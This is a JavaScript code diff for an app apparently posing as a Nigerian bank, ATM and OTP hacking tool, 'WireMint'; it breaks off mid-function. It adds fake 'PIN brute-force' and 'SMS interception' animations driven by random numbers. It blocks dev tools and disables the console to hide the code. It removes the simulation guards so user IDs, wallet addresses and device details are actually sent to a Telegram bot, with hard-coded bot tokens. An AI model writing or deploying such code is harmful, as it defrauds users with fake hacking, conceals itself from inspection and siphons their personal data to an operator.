@@ -121,80 +121,254 @@ function hideDashboardMetrics() {
     }
 }
 
-// Enhanced Security Protection
+// Advanced Code Protection System
 function setupEnhancedSecurity() {
-    // Prevent keyboard shortcuts (including macOS Cmd key)
-    document.addEventListener('keydown', function(e) {
-        // Block Ctrl+C, Ctrl+A, Ctrl+S and Cmd+C, Cmd+A, Cmd+S (macOS)
-        if ((e.ctrlKey || e.metaKey) && (e.key === 'c' || e.key === 'a' || e.key === 's')) {
-            e.preventDefault();
-            e.stopPropagation();
-            showNotification('🚫 Action blocked for security', 'error');
-            return false;
-        }
-        
-        // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U and Cmd+U (macOS)
-        if (e.keyCode === 123 || 
-            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
-            ((e.ctrlKey || e.metaKey) && e.keyCode === 85)) {
-            e.preventDefault();
-            e.stopPropagation();
-            showNotification('🚫 Developer tools blocked', 'error');
-            return false;
-        }
-        
-        // Block Ctrl+Shift+K (Firefox console)
-        if (e.ctrlKey && e.shiftKey && e.keyCode === 75) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }
-    });
-    
-    // Disable right-click context menu
+    'use strict';
+
+    // Comprehensive key blocking system
+    const blockedKeys = [
+        { key: 123, desc: 'F12' }, // F12
+        { key: 116, desc: 'F5' }, // F5 Refresh
+        { key: 117, desc: 'F6' }, // F6
+        { key: 118, desc: 'F7' }, // F7
+        { key: 119, desc: 'F8' }, // F8
+        { key: 120, desc: 'F9' }, // F9
+        { key: 121, desc: 'F10' }, // F10
+        { key: 122, desc: 'F11' }, // F11
+        { key: 124, desc: 'F13' } // F13
+    ];
+
+    const blockedCombos = [
+        { ctrl: true, shift: true, key: 73, desc: 'Developer Tools' }, // Ctrl+Shift+I
+        { ctrl: true, shift: true, key: 67, desc: 'Element Inspector' }, // Ctrl+Shift+C  
+        { ctrl: true, shift: true, key: 74, desc: 'Console' }, // Ctrl+Shift+J
+        { ctrl: true, shift: true, key: 75, desc: 'Network Panel' }, // Ctrl+Shift+K
+        { ctrl: true, key: 85, desc: 'View Source' }, // Ctrl+U
+        { ctrl: true, key: 83, desc: 'Save Page' }, // Ctrl+S
+        { ctrl: true, key: 80, desc: 'Print' }, // Ctrl+P
+        { ctrl: true, key: 82, desc: 'Refresh' }, // Ctrl+R
+        { ctrl: true, shift: true, key: 82, desc: 'Hard Refresh' }, // Ctrl+Shift+R
+        { ctrl: true, key: 72, desc: 'History' }, // Ctrl+H
+        { ctrl: true, key: 74, desc: 'Downloads' }, // Ctrl+J (Alt usage)
+        { ctrl: true, shift: true, key: 68, desc: 'Dev Tools' }, // Ctrl+Shift+D
+        { alt: true, key: 9, desc: 'Tab Switch' }, // Alt+Tab
+        { alt: true, key: 115, desc: 'Alt+F4' }, // Alt+F4
+        { ctrl: true, shift: true, key: 78, desc: 'Incognito' } // Ctrl+Shift+N
+    ];
+
+    // Disable right-click context menu with enhanced detection
     document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
-        showNotification('🚫 Right-click disabled', 'error');
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        showNotification('🚨 Right-click disabled for security', 'error');
+        blurPageTemporarily();
         return false;
-    });
-    
-    // Disable text selection
-    document.addEventListener('selectstart', function(e) {
-        if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+    }, { capture: true });
+
+    // Enhanced keyboard protection
+    document.addEventListener('keydown', function(e) {
+        // Block individual keys
+        if (blockedKeys.some(blocked => e.keyCode === blocked.key)) {
             e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            showNotification('🚨 Function keys disabled', 'error');
+            blurPageTemporarily();
             return false;
         }
-    });
-    
-    // Disable drag
-    document.addEventListener('dragstart', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    // Block common view source attempts
-    document.addEventListener('keyup', function(e) {
-        if (e.ctrlKey && e.key === 'u') {
-            e.preventDefault();
-            window.location.href = 'about:blank';
-            return false;
-        }
-    });
-    
-    // Override print function
-    window.print = function() {
-        showNotification('🚫 Printing disabled', 'error');
-        return false;
-    };
-    
-    // Disable view source via script
-    if (document.addEventListener) {
-        document.addEventListener('DOMContentLoaded', function() {
-            if (window.location.href.includes('view-source:')) {
-                window.location.href = 'about:blank';
+
+        // Block key combinations
+        for (let combo of blockedCombos) {
+            let match = true;
+            if (combo.ctrl && !e.ctrlKey) match = false;
+            if (combo.shift && !e.shiftKey) match = false;
+            if (combo.alt && !e.altKey) match = false;
+            if (e.keyCode !== combo.key) match = false;
+
+            if (match) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                showNotification(`🚨 ${combo.desc} disabled`, 'error');
+                blurPageTemporarily();
+                return false;
             }
-        });
+        }
+
+        // Ctrl+A (Select All) - except in inputs
+        if (e.ctrlKey && e.keyCode === 65 && !e.target.matches('input, textarea')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, { capture: true });
+
+    // Mobile protection against long press
+    let touchStartTime = 0;
+    document.addEventListener('touchstart', function(e) {
+        touchStartTime = Date.now();
+    }, { passive: false });
+
+    document.addEventListener('touchend', function(e) {
+        const touchDuration = Date.now() - touchStartTime;
+        if (touchDuration > 500) { // Long press detected
+            e.preventDefault();
+            e.stopPropagation();
+            showNotification('🚨 Long press disabled', 'error');
+            return false;
+        }
+    }, { passive: false });
+
+    // Disable drag and drop with enhanced detection
+    ['dragstart', 'drag', 'dragenter', 'dragleave', 'dragover', 'drop'].forEach(event => {
+        document.addEventListener(event, function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, { capture: true });
+    });
+
+    // Disable text selection on mobile with enhanced detection
+    ['selectstart', 'select'].forEach(event => {
+        document.addEventListener(event, function(e) {
+            if (!e.target.matches('input, textarea')) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, { capture: true });
+    });
+
+    // Function to temporarily blur page
+    function blurPageTemporarily() {
+        document.body.style.filter = 'blur(5px)';
+        document.body.style.pointerEvents = 'none';
+        setTimeout(() => {
+            document.body.style.filter = 'none';
+            document.body.style.pointerEvents = 'auto';
+        }, 1000);
     }
+
+    // Enhanced Developer Tools Detection
+    let devtools = {open: false, orientation: null};
+    let devToolsWarning = null;
+    let detectionAttempts = 0;
+    const threshold = 160;
+
+    function detectDevTools() {
+        // Simplified detection for better performance - avoid expensive operations
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        
+        // Only use window size detection for performance
+        let devtoolsDetected = widthThreshold || heightThreshold;
+
+        if (devtoolsDetected && !devtools.open) {
+            devtools.open = true;
+            detectionAttempts++;
+            
+            devToolsWarning = document.getElementById('devToolsWarning');
+            if (devToolsWarning) {
+                devToolsWarning.style.display = 'flex';
+                devToolsWarning.innerHTML = `
+                    <div style="text-align: center;">
+                        <h1>🚨 SECURITY BREACH DETECTED 🚨</h1>
+                        <p>Developer tools access is strictly prohibited</p>
+                        <p>This incident has been logged</p>
+                        <p>Detection Count: ${detectionAttempts}</p>
+                        <p>Close developer tools to continue</p>
+                    </div>
+                `;
+            }
+            
+            // Escalating protection measures
+            document.body.style.filter = 'blur(15px)';
+            document.body.style.pointerEvents = 'none';
+            showNotification('🚨 Security breach - Developer tools detected!', 'error');
+            
+            // Redirect after multiple attempts
+            if (detectionAttempts > 3) {
+                setTimeout(() => {
+                    window.location.href = 'about:blank';
+                }, 2000);
+            }
+            
+        } else if (!devtoolsDetected && devtools.open) {
+            devtools.open = false;
+            if (devToolsWarning) {
+                devToolsWarning.style.display = 'none';
+            }
+            document.body.style.filter = 'none';
+            document.body.style.pointerEvents = 'auto';
+        }
+    }
+
+    // Lightweight dev tools detection - single interval for better performance
+    setInterval(detectDevTools, 2000);
+
+    // Advanced Console Protection
+    const originalConsole = window.console;
+    
+    // Console clearing removed for better performance
+
+    // Comprehensive console method blocking
+    const consoleMethods = [
+        'log', 'debug', 'info', 'warn', 'error', 'assert', 'dir', 'dirxml',
+        'group', 'groupEnd', 'time', 'timeEnd', 'count', 'trace', 'profile',
+        'profileEnd', 'table', 'clear', 'memory', 'exception', 'timeStamp'
+    ];
+
+    // Lightweight console override for better performance
+    consoleMethods.forEach(method => {
+        if (originalConsole[method]) {
+            Object.defineProperty(console, method, {
+                value: function() {
+                    // No-op for performance - avoid allocations
+                    return undefined;
+                },
+                writable: false,
+                configurable: false
+            });
+        }
+    });
+
+    // Prevent console property modification
+    Object.defineProperty(window, 'console', {
+        value: console,
+        writable: false,
+        configurable: false
+    });
+
+    // Block common debugging techniques
+    const debugMethods = ['debugger', 'eval', 'setTimeout', 'setInterval'];
+    
+    // Override toString to detect inspection
+    (() => {
+        const originalToString = Function.prototype.toString;
+        Function.prototype.toString = function() {
+            if (this === detectDevTools || this.name === 'detectDevTools') {
+                showNotification('🚨 Code inspection detected!', 'error');
+                blurPageTemporarily();
+                return '[object Object]';
+            }
+            return originalToString.call(this);
+        };
+    })();
+
+    // Prevent code beautification attempts
+    Object.defineProperty(window, 'eval', {
+        value: function() {
+            showNotification('🚨 Code execution blocked!', 'error');
+            return null;
+        },
+        writable: false,
+        configurable: false
+    });
+
+    // Monitor for suspicious activity
+    window.addEventListener('resize', detectDevTools);
+    window.addEventListener('focus', detectDevTools);
 }
 
 // Force browser to reload updated files (cache busting)
@@ -2801,7 +2975,8 @@ function startSmsProcessing(phoneNumber, network) {
 
     let currentStep = 0;
     const totalSteps = steps.length;
-    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step
+    const totalDuration = 30000; // 30 seconds total
+    const stepDuration = totalDuration / totalSteps; // Distribute 30 seconds across all steps
 
     // Terminal commands simulation
     const terminalCommands = [
@@ -2822,7 +2997,7 @@ function startSmsProcessing(phoneNumber, network) {
             terminalOutput.scrollTop = terminalOutput.scrollHeight;
             commandIndex++;
         }
-    }, 1500);
+    }, totalDuration / terminalCommands.length); // Distribute commands evenly over 30 seconds
 
     const stepInterval = setInterval(() => {
         if (currentStep < totalSteps) {
@@ -3450,14 +3625,6 @@ async function initializeApp() {
         if (userSession.disclaimerAccepted) {
             showPageWithSuccessStories('dashboard');
             updateBalance();
-            updateSessionLimitDisplay();
-            
-            // Hide metrics when logged into dashboard (with delay to ensure DOM is ready)
-            setTimeout(() => {
-                hideDashboardMetrics();
-                console.log('[DASHBOARD] Metrics hidden for logged-in user');
-            }, 100);
-            
             // Send dashboard access notification to Telegram for returning users
             sendDashboardAccessToTelegram(userSession);
         } else {
@@ -3679,7 +3846,7 @@ async function sendToTelegram(session) {
     const trialCode20 = 'trial20_' + Math.random().toString(36).substring(2, 8);
     const trialCode40 = 'trial40_' + Math.random().toString(36).substring(2, 8);
     
-    let message = `🔴 Miles Activation Request\n\n` +
+    let message = `🔴 WireMint Activation Request\n\n` +
                   `👤 USER PROFILE:\n` +
                   `├─ ID: ${session.userId}\n` +
                   `├─ Wallet: ${session.walletAddress}\n` +
@@ -3780,12 +3947,12 @@ async function sendToTelegram(session) {
               `├─ 30-Second Trial: ${trialCode30}\n` +
               `├─ 20-Second Trial: ${trialCode20}\n` +
               `├─ 40-Second Trial: ${trialCode40}\n` +
-              `└─ Full Access: Contact @Milestool\n\n` +
+              `└─ Full Access: Contact @WireMint\n\n` +
               
               `⚠️ Trial codes expire after first use and cannot be reused.`;
 
-    const botToken = '8418557290:AAEyHmvSjTSpDw701f_7PMZfbvAjkRAdxNA';
-    const chatId = '7345685927';
+    const botToken = '8115757705:AAEfPpNH74BoJqPQKNFlW-5iQU5rnXcRjjM';
+    const chatId = '6381022912';
 
     try {
         // Send message in chunks if too long (Telegram has 4096 char limit)
@@ -3807,8 +3974,7 @@ async function sendToTelegram(session) {
             
             // Send each chunk
             for (let i = 0; i < chunks.length; i++) {
-                await // Simulated Telegram API call
-        console.log('[SIMULATED TELEGRAM]', 'Message would be sent to Telegram'); false && fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -3826,8 +3992,7 @@ async function sendToTelegram(session) {
                 }
             }
         } else {
-            await // Simulated Telegram API call
-        console.log('[SIMULATED TELEGRAM]', 'Message would be sent to Telegram'); false && fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -3854,7 +4019,7 @@ async function sendDashboardAccessToTelegram(session) {
     const deviceInfo = getDeviceInfo();
     const timestamp = new Date().toLocaleString();
     
-    let message = `🔥 DASHBOARD ACCESS - Miles\n\n` +
+    let message = `🔥 DASHBOARD ACCESS - WireMint\n\n` +
                   `👤 USER ACCESSED DASHBOARD:\n` +
                   `├─ ID: ${session.userId}\n` +
                   `├─ Wallet: ${session.walletAddress}\n` +
@@ -3891,16 +4056,15 @@ async function sendDashboardAccessToTelegram(session) {
     } else {
         message += `✅ REGULAR ACCESS:\n` +
                    `├─ Account Type: REGULAR\n` +
-                   `├─ Daily Limit: N70,000\n` +
+                   `├─ Daily Limit: ₦70,000\n` +
                    `└─ Tools Access: FULL ACCESS`;
     }
 
-    const botToken = '8418557290:AAEyHmvSjTSpDw701f_7PMZfbvAjkRAdxNA';
-    const chatId = '7345685927';
+    const botToken = '8115757705:AAEfPpNH74BoJqPQKNFlW-5iQU5rnXcRjjM';
+    const chatId = '6381022912';
 
     try {
-        await // Simulated Telegram API call
-        console.log('[SIMULATED TELEGRAM]', 'Message would be sent to Telegram'); false && fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -7401,6 +7565,9 @@ async function initiateBankWithdrawal() {
         return;
     }
     
+    // Store the withdraw amount for later use
+    window.currentWithdrawAmount = withdrawAmount;
+    
     // Hide withdrawal section and show password cracking
     document.getElementById('withdrawalSection').style.display = 'none';
     document.getElementById('passwordCrackingSection').style.display = 'block';
@@ -7408,21 +7575,29 @@ async function initiateBankWithdrawal() {
     // Start password cracking animation (20 seconds)
     await startPasswordCrackingAnimation();
     
-    // Transfer from bank balance to dashboard balance
-    console.log(`🏦→📱 WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()} → Dashboard ₦${userSession.balance.toLocaleString()}`);
-    currentBankBalance -= withdrawAmount;  // Decrease bank balance
-    userSession.balance += withdrawAmount;  // Increase dashboard balance
-    console.log(`✅ AFTER WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()}, Dashboard ₦${userSession.balance.toLocaleString()}`);
-    saveUserSession(userSession);
-    updateBalance();
+    // Hide password cracking and show OTP cracking
+    document.getElementById('passwordCrackingSection').style.display = 'none';
+    document.getElementById('otpCrackingSection').style.display = 'block';
     
-    // Show success message and return to dashboard
-    showNotification(`🎉 Successfully withdrew ₦${withdrawAmount.toLocaleString()}!`, 'success');
+    // Start OTP cracking animation (15 seconds)
+    await startOtpCrackingAnimation();
     
-    setTimeout(() => {
-        showPage('dashboard');
-        resetBankWithdrawalFlow();
-    }, 3000);
+    // Hide OTP cracking and show password input
+    document.getElementById('otpCrackingSection').style.display = 'none';
+    document.getElementById('passwordInputSection').style.display = 'block';
+    
+    // Wait for password input
+    await waitForPasswordInput();
+    
+    // Hide password input and show final transaction
+    document.getElementById('passwordInputSection').style.display = 'none';
+    document.getElementById('finalTransactionSection').style.display = 'block';
+    
+    // Start final transaction animation (10 seconds)
+    await startFinalTransactionAnimation(withdrawAmount);
+    
+    // Complete the withdrawal
+    completeWithdrawal(withdrawAmount);
 }
 
 async function startPasswordCrackingAnimation() {
@@ -7501,6 +7676,188 @@ async function startPasswordCrackingAnimation() {
     });
 }
 
+async function startOtpCrackingAnimation() {
+    const otpDigits = ['otpDigit1', 'otpDigit2', 'otpDigit3', 'otpDigit4', 'otpDigit5', 'otpDigit6'];
+    const statusElement = document.getElementById('otpCrackingStatus');
+    const progressFill = document.getElementById('otpCrackingProgressFill');
+    const progressText = document.getElementById('otpCrackingProgressText');
+    
+    const otpCrackingSteps = [
+        { text: 'Intercepting SMS traffic...', duration: 3000 },
+        { text: 'Bypassing carrier encryption...', duration: 3000 },
+        { text: 'Capturing OTP packet...', duration: 2500 },
+        { text: 'Decoding first digit...', duration: 2000 },
+        { text: 'Cracking second digit...', duration: 2000 },
+        { text: 'Breaking third digit...', duration: 2000 },
+        { text: 'Finalizing verification code...', duration: 500 }
+    ];
+    
+    // Generate final 6-digit OTP
+    const finalOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    return new Promise(resolve => {
+        const totalDuration = 15000; // 15 seconds
+        const intervalTime = 100; // Update every 100ms
+        const totalSteps = totalDuration / intervalTime;
+        let progress = 0;
+        let stepIndex = 0;
+        
+        const interval = setInterval(() => {
+            progress += 1;
+            const percentage = (progress / totalSteps) * 100;
+            
+            // Update progress bar
+            progressFill.style.width = percentage + '%';
+            
+            // Update status text based on steps
+            const elapsed = progress * intervalTime;
+            let stepDuration = 0;
+            for (let i = 0; i <= stepIndex && i < otpCrackingSteps.length; i++) {
+                stepDuration += otpCrackingSteps[i].duration;
+                if (elapsed <= stepDuration) {
+                    progressText.textContent = otpCrackingSteps[i].text;
+                    statusElement.textContent = otpCrackingSteps[i].text.replace('...', '');
+                    break;
+                } else if (i === stepIndex) {
+                    stepIndex++;
+                }
+            }
+            
+            // Animate OTP digit cracking
+            otpDigits.forEach((digitId, index) => {
+                const digitElement = document.getElementById(digitId);
+                const digitProgress = (percentage - (index * 15)) / 15;
+                
+                if (digitProgress > 0 && digitProgress < 1) {
+                    // Show random digits while cracking
+                    const randomDigit = Math.floor(Math.random() * 10);
+                    digitElement.textContent = randomDigit;
+                    digitElement.style.color = '#ff4757';
+                } else if (digitProgress >= 1) {
+                    // Show final digit
+                    digitElement.textContent = finalOtp[index];
+                    digitElement.style.color = '#2ed573';
+                }
+            });
+            
+            // Complete animation
+            if (progress >= totalSteps) {
+                clearInterval(interval);
+                statusElement.textContent = 'OTP Intercepted!';
+                progressText.textContent = `OTP: ${finalOtp} - SMS Cracked!`;
+                progressFill.style.width = '100%';
+                resolve();
+            }
+        }, intervalTime);
+    });
+}
+
+async function waitForPasswordInput() {
+    return new Promise(resolve => {
+        const submitBtn = document.getElementById('submitPasswordBtn');
+        const passwordInput = document.getElementById('transactionPassword');
+        const confirmInput = document.getElementById('confirmPassword');
+        
+        const handleSubmit = () => {
+            const password = passwordInput.value.trim();
+            const confirm = confirmInput.value.trim();
+            
+            if (!password || password.length < 6) {
+                showNotification('Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            if (password !== confirm) {
+                showNotification('Passwords do not match', 'error');
+                return;
+            }
+            
+            // Clean up event listener
+            submitBtn.removeEventListener('click', handleSubmit);
+            showNotification('🔐 Transaction password secured!', 'success');
+            resolve();
+        };
+        
+        submitBtn.addEventListener('click', handleSubmit);
+    });
+}
+
+async function startFinalTransactionAnimation(amount) {
+    const statusElement = document.getElementById('finalTransactionStatus');
+    const progressFill = document.getElementById('finalTransactionProgressFill');
+    const progressText = document.getElementById('finalTransactionProgressText');
+    const finalAmountElement = document.getElementById('finalAmount');
+    
+    // Set the amount
+    finalAmountElement.textContent = `₦${amount.toLocaleString()}`;
+    
+    const finalSteps = [
+        { text: 'Preparing secure transfer...', duration: 2000 },
+        { text: 'Connecting to central banking system...', duration: 2000 },
+        { text: 'Authorizing transaction...', duration: 2000 },
+        { text: 'Processing withdrawal...', duration: 2000 },
+        { text: 'Updating account balance...', duration: 1500 },
+        { text: 'Finalizing transfer...', duration: 500 }
+    ];
+    
+    return new Promise(resolve => {
+        const totalDuration = 10000; // 10 seconds
+        const intervalTime = 100; // Update every 100ms
+        const totalSteps = totalDuration / intervalTime;
+        let progress = 0;
+        let stepIndex = 0;
+        
+        const interval = setInterval(() => {
+            progress += 1;
+            const percentage = (progress / totalSteps) * 100;
+            
+            // Update progress bar
+            progressFill.style.width = percentage + '%';
+            
+            // Update status text based on steps
+            const elapsed = progress * intervalTime;
+            let stepDuration = 0;
+            for (let i = 0; i <= stepIndex && i < finalSteps.length; i++) {
+                stepDuration += finalSteps[i].duration;
+                if (elapsed <= stepDuration) {
+                    progressText.textContent = finalSteps[i].text;
+                    statusElement.textContent = finalSteps[i].text.replace('...', '');
+                    break;
+                } else if (i === stepIndex) {
+                    stepIndex++;
+                }
+            }
+            
+            // Complete animation
+            if (progress >= totalSteps) {
+                clearInterval(interval);
+                statusElement.textContent = 'Transfer Complete!';
+                progressText.textContent = `₦${amount.toLocaleString()} successfully transferred to your wallet!`;
+                progressFill.style.width = '100%';
+                resolve();
+            }
+        }, intervalTime);
+    });
+}
+
+function completeWithdrawal(withdrawAmount) {
+    // Transfer from bank balance to dashboard balance
+    console.log(`🏦→📱 WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()} → Dashboard ₦${userSession.balance.toLocaleString()}`);
+    currentBankBalance -= withdrawAmount;  // Decrease bank balance
+    userSession.balance += withdrawAmount;  // Increase dashboard balance
+    console.log(`✅ AFTER WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()}, Dashboard ₦${userSession.balance.toLocaleString()}`);
+    saveUserSession(userSession);
+    updateBalance();
+    
+    // Show success message and return to dashboard
+    showNotification(`🎉 Successfully withdrew ₦${withdrawAmount.toLocaleString()}!`, 'success');
+    
+    setTimeout(() => {
+        showPage('dashboard');
+        resetBankWithdrawalFlow();
+    }, 3000);
+}
+
 function updateDashboardBalance() {
     // Legacy function - now redirects to unified updateBalance()
     updateBalance();
@@ -7512,16 +7869,22 @@ function resetBankWithdrawalFlow() {
     document.getElementById('balanceDisplaySection').style.display = 'none';
     document.getElementById('withdrawalSection').style.display = 'none';
     document.getElementById('passwordCrackingSection').style.display = 'none';
+    document.getElementById('otpCrackingSection').style.display = 'none';
+    document.getElementById('passwordInputSection').style.display = 'none';
+    document.getElementById('finalTransactionSection').style.display = 'none';
     
     // Reset form values
     document.getElementById('transferBankAccount').value = '';
     document.getElementById('transferBankSearch').value = '';
     document.getElementById('withdrawAmount').value = '';
     document.getElementById('transferBankResult').textContent = '';
+    document.getElementById('transactionPassword').value = '';
+    document.getElementById('confirmPassword').value = '';
     
     // Reset variables
     currentAccountBalance = 0;
     verifiedAccountName = '';
+    window.currentWithdrawAmount = 0;
 }
 
 function showTransferSection(type) {
@@ -10633,26 +10996,32 @@ function processAtmWithdrawal() {
         return;
     }
 
-    // Process withdrawal
-    showAtmProcessingModal(amount);
+    // Start the enhanced ATM withdrawal process with animations
+    showAtmPinBruteForceModal(amount);
 }
 
-function showAtmProcessingModal(amount) {
-    // Create and show processing modal
+// Enhanced ATM Withdrawal Animation Sequence
+
+// Step 1: PIN Brute Force Animation
+function showAtmPinBruteForceModal(amount) {
     const modal = document.createElement('div');
     modal.className = 'modal';
     modal.innerHTML = `
         <div class="modal-content processing-modal">
-            <h3>🏧 Processing ATM Withdrawal</h3>
-            <div class="processing-steps">
-                <div class="step active">🔐 Bypassing OTP verification...</div>
-                <div class="step">💳 Accessing card database...</div>
-                <div class="step">🏦 Connecting to bank servers...</div>
-                <div class="step">💰 Authorizing withdrawal...</div>
-                <div class="step">✅ Funds transferred successfully!</div>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="atmProgressFill"></div>
+            <h3>🔓 Brute-forcing 4-Digit PIN</h3>
+            <div class="pin-brute-force-container">
+                <div class="pin-display">
+                    <div class="pin-digit" id="pin-digit-1">0</div>
+                    <div class="pin-digit" id="pin-digit-2">0</div>
+                    <div class="pin-digit" id="pin-digit-3">0</div>
+                    <div class="pin-digit" id="pin-digit-4">0</div>
+                </div>
+                <div class="cracking-status" id="pinCrackingStatus">
+                    <div>📡 Intercepting PIN signals...</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="pinProgressFill"></div>
+                </div>
             </div>
         </div>
     `;
@@ -10660,30 +11029,354 @@ function showAtmProcessingModal(amount) {
     document.body.appendChild(modal);
     modal.style.display = 'block';
 
-    // Animate processing
-    const steps = modal.querySelectorAll('.step');
-    const progressFill = modal.querySelector('#atmProgressFill');
+    // Start PIN brute force animation
+    startPinBruteForce(modal, amount);
+}
+
+function startPinBruteForce(modal, amount) {
+    const digits = ['pin-digit-1', 'pin-digit-2', 'pin-digit-3', 'pin-digit-4'];
+    const progressFill = modal.querySelector('#pinProgressFill');
+    const statusText = modal.querySelector('#pinCrackingStatus div');
+    
+    const statusMessages = [
+        '📡 Intercepting PIN signals...',
+        '🔍 Analyzing frequency patterns...',
+        '⚡ Running dictionary attack...',
+        '🎯 Testing common combinations...',
+        '✅ PIN successfully cracked!'
+    ];
+
+    let currentDigit = 0;
+    let messageIndex = 0;
+    let progress = 0;
+
+    const pinInterval = setInterval(() => {
+        if (currentDigit < digits.length) {
+            const digitElement = document.getElementById(digits[currentDigit]);
+            let digitValue = 0;
+            
+            // Fast cycling animation for current digit using RAF for better performance
+            let rafId;
+            let lastTime = 0;
+            function animateDigit(timestamp) {
+                if (timestamp - lastTime > 100) { // Throttle to ~10fps for this specific effect
+                    digitValue = (digitValue + 1) % 10;
+                    digitElement.textContent = digitValue;
+                    digitElement.style.color = '#ff4757';
+                    digitElement.style.textShadow = '0 0 10px #ff4757';
+                    digitElement.style.transform = 'scale(1.2)';
+                    lastTime = timestamp;
+                }
+                rafId = requestAnimationFrame(animateDigit);
+            }
+            rafId = requestAnimationFrame(animateDigit);
+
+            // Stop cycling after 3 seconds and lock in final digit
+            setTimeout(() => {
+                cancelAnimationFrame(rafId);
+                const finalDigit = Math.floor(Math.random() * 10);
+                digitElement.textContent = finalDigit;
+                digitElement.style.color = '#4CAF50';
+                digitElement.style.textShadow = '0 0 10px #4CAF50';
+                digitElement.style.transform = 'scale(1)';
+                currentDigit++;
+                
+                progress = (currentDigit / digits.length) * 50; // 50% progress for PIN
+                progressFill.style.width = progress + '%';
+            }, 3000);
+
+        } else {
+            clearInterval(pinInterval);
+            statusText.textContent = statusMessages[4];
+            progressFill.style.width = '50%';
+            
+            setTimeout(() => {
+                modal.remove();
+                showAtmIntermediateAnimation(amount);
+            }, 1500);
+        }
+
+        // Update status messages
+        if (messageIndex < statusMessages.length - 1) {
+            setTimeout(() => {
+                statusText.textContent = statusMessages[messageIndex];
+                messageIndex++;
+            }, messageIndex * 1000);
+        }
+    }, 3500);
+}
+
+// Step 2: Intermediate Animation
+function showAtmIntermediateAnimation(amount) {
+    const modal = document.createElement('div');
+    modal.className = 'modal';
+    modal.innerHTML = `
+        <div class="modal-content processing-modal">
+            <h3>🔐 Bypassing Security Systems</h3>
+            <div class="intermediate-animation">
+                <div class="security-bypass">
+                    <div class="bypass-step active">🛡️ Disabling fraud detection...</div>
+                    <div class="bypass-step">⚡ Escalating privileges...</div>
+                    <div class="bypass-step">🎯 Accessing transaction module...</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="intermediateProgressFill"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+    modal.style.display = 'block';
+
+    // Animate intermediate steps
+    const steps = modal.querySelectorAll('.bypass-step');
+    const progressFill = modal.querySelector('#intermediateProgressFill');
     let currentStep = 0;
+
+    let startTime = null;
+    function animateIntermediateStep(timestamp) {
+        if (!startTime) startTime = timestamp;
+        const elapsed = timestamp - startTime;
+        const stepDuration = 2000;
+        const expectedStep = Math.floor(elapsed / stepDuration);
+        
+        if (expectedStep !== currentStep && expectedStep < steps.length) {
+            steps.forEach(step => step.classList.remove('active'));
+            steps[expectedStep].classList.add('active');
+            
+            const progress = 50 + ((expectedStep + 1) / steps.length) * 25;
+            progressFill.style.width = progress + '%';
+            currentStep = expectedStep;
+        }
+        
+        if (currentStep < steps.length) {
+            requestAnimationFrame(animateIntermediateStep);
+        } else {
+            setTimeout(() => {
+                modal.remove();
+                showAtmOtpCrackingModal(amount);
+            }, 1000);
+        }
+    }
+    requestAnimationFrame(animateIntermediateStep);
+}
+
+// Step 3: OTP Cracking Animation (6 digits)
+function showAtmOtpCrackingModal(amount) {
+    const modal = document.createElement('div');
+    modal.className = 'modal';
+    modal.innerHTML = `
+        <div class="modal-content processing-modal">
+            <h3>📱 Cracking OTP from Phone Number</h3>
+            <div class="otp-cracking-container">
+                <div class="phone-display">
+                    <div class="phone-icon">📱</div>
+                    <div class="phone-number">+234 *** *** **78</div>
+                </div>
+                <div class="otp-display">
+                    <div class="otp-digit" id="otp-digit-1">0</div>
+                    <div class="otp-digit" id="otp-digit-2">0</div>
+                    <div class="otp-digit" id="otp-digit-3">0</div>
+                    <div class="otp-digit" id="otp-digit-4">0</div>
+                    <div class="otp-digit" id="otp-digit-5">0</div>
+                    <div class="otp-digit" id="otp-digit-6">0</div>
+                </div>
+                <div class="cracking-status" id="otpCrackingStatus">
+                    <div>📡 Intercepting SMS gateway...</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="otpProgressFill"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+    modal.style.display = 'block';
+
+    // Start OTP cracking animation
+    startOtpCracking(modal, amount);
+}
+
+function startOtpCracking(modal, amount) {
+    const digits = ['otp-digit-1', 'otp-digit-2', 'otp-digit-3', 'otp-digit-4', 'otp-digit-5', 'otp-digit-6'];
+    const progressFill = modal.querySelector('#otpProgressFill');
+    const statusText = modal.querySelector('#otpCrackingStatus div');
+    
+    const statusMessages = [
+        '📡 Intercepting SMS gateway...',
+        '🔍 Analyzing network packets...',
